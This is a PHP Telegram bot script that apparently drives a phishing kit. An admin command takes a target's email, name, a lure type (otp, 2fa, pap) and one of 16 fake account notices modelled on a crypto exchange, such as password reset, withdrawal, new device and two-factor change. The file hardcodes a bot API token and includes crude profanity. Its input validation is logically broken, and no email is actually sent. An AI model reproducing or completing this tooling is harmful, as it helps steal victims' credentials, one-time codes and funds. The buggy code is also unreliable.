<?php
ob_start();
define('API_KEY', '5188604291:AAFXXNL24LztfTGzShdKpQXayhi6oOalEA8');

//CONFIG
$config['admin'] = '-700445086';

function typing($ch){
	return bot('sendChatAction',['chat_id'=>$ch,'action'=>'typing',]);
}

function bot($method,$datas=[]){
	$url = "https://api.telegram.org/bot".API_KEY."/".$method;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
	$res = curl_exec($ch);
	if (curl_error($ch)) {
		var_dump(curl_error($ch));
	}else{
		return json_decode($res);
	}
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$m_id = $message->message_id;
$chat_id = $message->chat->id;
$username = $message->from->username;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$user_id = $message->from->id;
$text = $message->text;
$title_group = $message->chat->title;
$type = $message->chat->type;
$reply=$message->reply_to_message;
$nechtasoz=str_word_count($text);
$nharf = strlen($text);

//HELP
if ((strpos($text, "!aripkontol") === 0)||(strpos($text, "/aripkontol") === 0)){
	if ($chat_id == $config['admin']) {
		typing($chat_id);
		bot('sendmessage',['chat_id'=>$chat_id,'text'=>"Hi, aku ARIP NUGROHO KONTOL\n\n-=LETTER LIST=-\n[1].Reset Password Normal\n[2].Reset Password Disable\n[3].Reset Password GG\n[4].Password Change\n[5].Withdraw\n[6].Verify Identity\n[7].Disable\n[8].Unable Deposit\n[9].Locked\n[10].Verify ID Front Failed\n[11].New Device Confirmation\n[12].Your two-factor setting has changed\n[13].Send Coin\n[14].Reset Password Disable Espanol\n[15].Password Change Espanol\n[16].Verify ID Back Failed\n\n-=TYPE=-\n[1].otp\n[2].2fa\n[3].pap\n\nCara pakai?\nExample : /ngocok email nama type letter\n\n/ngocok arip@kontol.com Arip-jembot otp 2\n\nAdmin @edzalex",]);
	}
}

//SEND EMAIL
if ((strpos($text, "!ngocok") === 0)||(strpos($text, "/ngocok") === 0)){
	if ($chat_id == $config['admin']) {
		$info = explode(" ", $text);
		$email = $info[1];
		$nama = $info[2];
		$type = $info[3];
		$letter = $info[4];

		//Validate Email
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
			bot('sendmessage',['chat_id'=>$chat_id,'text'=>"Ini bukan email kontol, yang bener ngapa\n\n/aripkontol = Bantuan",]);
			exit();
		}

		//Validate Type otp/2fa/pap
		if ($type != "1" OR $type != "2" OR $type != "3") {
			bot('sendmessage',['chat_id'=>$chat_id,'text'=>"Pilihan type salah kontol, yang bener ngapa\n\n/aripkontol = Bantuan",]);
			exit();
		}

		//Validate Letter 1/16
		if ($letter != "1" OR $letter != "2" OR $letter != "3" OR $letter != "4" OR $letter != "5" OR $letter != "6" OR $letter != "7" OR $letter != "8" OR $letter != "9" OR $letter != "10" OR $letter != "11" OR $letter != "12" OR $letter != "13" OR $letter != "14" OR $letter != "15" OR $letter != "16") {
			bot('sendmessage',['chat_id'=>$chat_id,'text'=>"Pilihan letter salah kontol, yang bener ngapa\n\n/aripkontol = Bantuan",]);
			exit();
		}else{
			$letter = 'letter/'.$letter.'.html';
		}
	}
}
?>